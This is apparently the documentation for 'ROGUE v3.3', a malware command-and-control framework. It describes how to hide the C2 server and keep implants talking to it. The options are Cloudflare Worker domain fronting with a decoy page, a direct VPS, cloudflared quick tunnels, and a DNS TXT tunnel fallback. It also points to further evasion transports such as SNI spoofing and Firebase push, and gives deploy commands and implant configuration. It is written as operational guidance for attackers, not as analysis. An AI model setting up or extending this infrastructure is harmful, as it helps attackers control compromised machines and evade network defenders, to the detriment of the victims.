# ROGUE v3.3 - C2 Transport Options

ROGUE v3.3 is transport-agnostic: every message is end-to-end encrypted
(X25519 + AES-256-GCM) between implant and C2, so the transport is just a
pipe. `c2_hosts` in the implant config is a list of base URLs tried in order
(tier 0). Below are the current options.

## Recommended options

### 1. Cloudflare Worker fronting (recommended tier 0)

Hide the C2 behind a Cloudflare Worker that routes on the Host header and
serves a decoy page to everyone else. Deploy `deploy/cloudflare_worker.js`
(pattern from the churchofmalware noPROXY_c2s c2s_cdn_fronting project):

```bash
cd deploy
wrangler deploy cloudflare_worker.js     # set C2_HOST + BACKEND_URL vars
```

Point the implant at the hidden hostname:

```python
# rogue_v2_config.py
c2_hosts = ['https://c2-api.yourdomain.com/']
```

Traffic to the worker looks like ordinary CDN traffic; everything else gets
the decoy page. ROGUE frames ride through as opaque POST bodies.

### 2. Direct VPS on 443 (no proxy at all)

Simplest and most opsec-clean if you control a host: put rogue_c2.py behind
Caddy/nginx TLS on 443 and set `c2_hosts = ['https://your-vps-domain/']`.
No third party in the path.

### 3. cloudflared quick tunnel (zero account, random host)

```bash
ROGUE_TUNNEL=cloudflared python3 rogue_c2.py
```

spawns `cloudflared tunnel --url http://localhost:4444` and prints the
`*.trycloudflare.com` URL. Fine for tests; hostname is random each start.

### 4. DNS tunnel tier (built in)

ROGUE v3.3 already ships the DNS fallback tier: the implant chunks encrypted
frames into TXT queries; `payloads/dnstunnel.py` bridges DNS back to the C2
(also see the Go `c2s_dns_tunnel` in noPROXY_c2s for an authoritative
variant). Configure `dns_zone` + `dns_resolver` in the implant config.

### 5. Other noPROXY_c2s patterns

The noPROXY_c2s repo (churchofmalware) has more transports that ROGUE can
sit on with the right shim: SNI spoofing (uTLS-style, needs a custom TLS
client), WebSocket abuse, Firebase ghost-push, NATS, WebRTC. Each becomes
another entry in `c2_hosts`-style logic once the shim exists - the crypto
layer does not change.

## Runtime controls

```bash
ROGUE_TUNNEL=cloudflared python3 rogue_c2.py   # quick tunnel autostart
ROGUE_TUNNEL=none       python3 rogue_c2.py    # default: no tunnel, manual host
```
